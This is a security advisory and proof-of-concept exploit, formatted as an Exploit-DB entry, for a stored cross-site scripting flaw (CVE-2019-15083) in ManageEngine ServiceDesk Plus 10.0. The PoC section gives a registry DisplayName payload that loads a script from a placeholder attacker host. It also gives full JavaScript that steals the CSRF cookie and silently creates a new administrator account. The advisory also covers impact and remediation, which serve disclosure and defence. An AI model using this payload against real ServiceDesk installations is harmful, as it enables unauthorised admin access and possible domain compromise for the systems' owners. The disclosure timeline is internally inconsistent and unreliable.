@@ -1,0 +1,121 @@
+# Exploit Title: ManageEngine Service Desk 10.0 - Cross-Site Scripting
+# Date: 2020-05-14
+# Exploit Author: Felipe Molina (@felmoltor)
+# Vendor Homepage: https://www.manageengine.com/
+# Software Link: https://www.manageengine.com/products/service-desk/download.html
+# Version: 10.0 (10000.0.0.0)
+# Tested on: Windows 10 
+# CVE : CVE-2019-15083
+
+
+[SPUK-2020-05/ManageEngine Service Desk XSS in remote IT Assets Management  ]------------------------------
+
+SECURITY ADVISORY:   SPUK-2019-04/ManageEngine Service Desk XSS in remote IT Assets Management 
+
+Affected Software:   ManageEngine Service Desk Plus (version 10.0, installer version 10000.0.0.0, SHA1: 86EA684666CE85AF710CA9805B7FF37E3D4FD65D)
+Vulnerability:       Cross-Site Scripting
+CVE:                 CVE-2019-15083
+CVSSv3:              5.9 (CVSS:3.0/AV:A/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N)
+Severity:            Medium
+Release Date:        2020-05-14
+
+I. Background
+~~~~~~~~~~~~~
+
+From ManageEngine's website:
+
+"ServiceDesk Plus is a game changer in turning IT teams from daily fire-fighting to delivering awesome customer service. It provides great visibility and central control in dealing with IT issues to ensure that businesses suffer no downtime. For 10 years and running, it has been delivering smiles to millions of IT folks, end users, and stakeholders alike.
+
+Version Enterprise: help desk + ITIL + asset + project
+
+The complete ITIL ready ITSM suite with all features that an IT service desk needs.
+
+* Incident management
+* Problem management
+* Change management
+* IT project management
+* Service catalog
+* Asset management
+* CMDB"
+
+II. Description
+~~~~~~~~~~~~~~~
+
+From wks administrator to Manage Engine Administrator:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Default installations of "ManageEngine ServiceDesk Plus 10.0" were found to be vulnerable to a XSS injected by a workstation local administrator. Using the installed program names of the computer as a vector, the local administrator can execute JavaScript code on the Manage Engine ServiceDesk administrator side.
+
+On "Asset Home > Server > <workstation> > software" the administrator of ManageEngine can control what software is installed on the workstation. This table shows all the installed program names on the column "Software". In this field and probably in others, a remote attacker can inject malicious code in order to execute it when the ManageEngine admnistrator visualizes this page.
+
+In this case, the provided proof of concept creates a administrator user on ManageEngine Service Desk.
+
+PoC:
+~~~~
+
+1. Access to the workstation managed by ManageEngine with a local administrator account.
+2. Open regedit.exe as administrator
+3. Navigate to "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<program>"
+4. Change the current "DisplayName" to this value:
+	test</a><script src=http://<attacker_ip>/addadmin.js type="text/javascript"/><a>bla
+5. On the root of <attacker_ip> web server, deploy the file "addadmin.js" with this content:
+	var createAdminParams= "sdpcsrfparam=<TOKEN>&mode=new&loginPermitted=null&loggedUserId=4&userID=-1&divToShow=listView&firstName=Legituser+4&middleName=L&lastName=Inocent+4&fullName=Legituser+4+L+Inocent+4&ciTypeId=6&ciId=null&employeeID=666&CI_BaseElement_IMPACTID=null&ciDescription=&ciName=Legituser+4+L+Inocent+4&email=&phone=&mobile=&smsID=&cost=0.00&deptName=None&reportingToid=&reportingTo=&jobTitle=&isSDSiteAdmin=false&associatedSites=null&projectrole=null&canApproveSR=false&approveLimitValue=&provideLogin=on&sdpAPIKey=&apiKeyExpiry=&userName=legituser4&addNewLogin=true&userPwd=legituser&confirmUserPwd=legituser&userDomain=None&isAdmin=SDAdmin&assignedRoles=2&dcRole=DCAdmin&froModuleForUDF=TECH&addButton=Save";
+
+	// Save the CSRF cookie into a variable
+	var sdpcsrfcookie;
+	carr = document.cookie.split(";");
+	for (i=0;i<carr.length;i++){
+		if (carr[i].split("=")[0].trim() == "sdpcsrfcookie"){
+			sdpcsrfcookie=carr[i].split("=")[1].trim();
+		}
+	}
+
+	if (sdpcsrfcookie === undefined){
+		console.log("No CSRF cookie was found. Aborting the PoC :-(")
+	}
+	else {
+		var ajaxreq = new XMLHttpRequest();
+		ajaxreq.open('POST', '/TechnicianDef.do');
+		ajaxreq.withCredentials = true;  
+		ajaxreq.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml");
+		ajaxreq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		console.log("Creating a new user on Manage Engine with CSRF token: "+sdpcsrfcookie);
+		// Update the CSRF token parameter with the token present in the user cookie
+		params = createAdminParams.replace("<TOKEN>",sdpcsrfcookie);
+		console.log("posting to create a new admin user: "+params);
+		ajaxreq.send(params);
+	}
+6. Reboot the workstation to forthe the agent to update the program list.
+7. Now, login as the administrator of ManageEngine SelfService.
+8. Navigate to "Asset Home > Server > <workstation> > software"
+9. Click on "Next" button until the software name is visualized on the table.
+10. Now, go to "Admin > Users > Technicians" and verify that the administrator user "legituser4 " has been created.
+
+III. Impact
+~~~~~~~~~~~
+
+The XSS can be injected remotely from any workstation that is being managed by ManageEngine ServiceDesk with no need for the attacker to access the web application. This PoC shows the creation of an administrator of ManageEngine, but it can be potentially used to create Domain Admin users if the service is configured properly, therefore, compromising the whole domain where the workstation is in.
+
+CVSS 3.0 Score:
+
+https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N
+
+
+IV. Remediation
+~~~~~~~~~~~~~~~
+
+Sanitize all the input from the remote agents before showing the values in the web page. Use typical XSS protection also for values that are not directly input on web formularies of the application.
+
+
+V. Disclosure
+~~~~~~~~~~~~~
+
+Reported By: Felipe Molina de la Torre (Felipe (at) SensePost.com)
+
+Vendor Informed:              2019-04-30
+Patch Release Date:           2019-04-16
+Publick Ack. of the vuln:     2020-05-13
+Advisory Release Date:        2020-05-14
+
+
+---------------------------------[SPUK-2020-05/ManageEngine Service Desk XSS in remote IT Assets Management  ]---
